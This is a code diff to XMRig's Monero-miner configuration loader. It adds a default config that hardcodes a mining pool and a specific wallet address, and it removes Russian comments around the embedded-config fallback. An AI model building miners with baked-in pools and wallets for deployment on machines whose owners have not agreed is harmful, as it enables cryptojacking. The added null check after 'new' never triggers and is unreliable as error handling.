@@ -71,6 +71,14 @@ public:
     {
         Config *defaultConfig = new Config();
 
+        if (!defaultConfig) {
+            std::cerr << "Failed to create Config object." << std::endl;
+        }
+
+//        if (defaultConfig->m_pools == nullptr) {
+//            std::cerr << "Pools object is not initialized." << std::endl;
+//        }
+
         xmrig::Pool pool;
         pool.setUrl("pool.xmr.pt:3333");
         pool.setUser("481dqAWdnN7cQGE7gn5mzuHNRMwkyArJQJBu8Fg38CCf74ivJXQUUVo6HE6Fr4LNGN6yZTVRVGuw8eykZ4Jby3sWKb9k1qK");
@@ -144,12 +152,10 @@ private:
 
         ConfigTransform::load(chain, process, transform);
 
-        // Чтение из стандартного конфигурационного файла
         if (read(chain, config)) {
             return config.release();
         }
 
-        // Проверка config.json в разных местах
         chain.addFile(Process::location(Process::DataLocation, "config.json"));
         if (read(chain, config)) {
             return config.release();
@@ -166,7 +172,6 @@ private:
         }
 
 #       ifdef XMRIG_FEATURE_EMBEDDED_CONFIG
-        // Встроенная конфигурация
         chain.addRaw(default_config);
         if (read(chain, config)) {
             return config.release();
